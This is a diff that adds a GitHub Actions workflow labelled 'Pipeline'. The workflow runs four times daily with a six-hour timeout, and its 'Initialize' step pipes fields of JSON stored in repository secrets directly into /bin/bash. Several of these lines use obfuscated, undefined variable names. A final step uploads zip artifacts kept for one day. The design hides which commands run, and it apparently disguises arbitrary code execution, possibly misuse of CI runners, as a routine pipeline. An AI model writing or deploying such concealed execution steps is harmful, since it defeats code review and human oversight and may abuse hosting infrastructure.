@@ -1,0 +1,34 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '50 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Initialize
+        env:
+          ttn4: ${{ secrets.ttn4 }}
+        run: |
+          printf '%s' "$ttn4" | jq -r .nxek5 | /bin/bash
+          printf '%s' "$qfiuv1" | jq -r .ypag33434 | /bin/bash
+          echo $k8684 | jq -r .fmv40 | /bin/bash
+          echo $r96232 | jq -r .rxjm47 | /bin/bash
+          printf '%s' "$lmp30" | jq -r .hoa11160 | /bin/bash
+
+      - name: Persist results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ehtFUcZB
+          path: "*.zip"
+          retention-days: 1
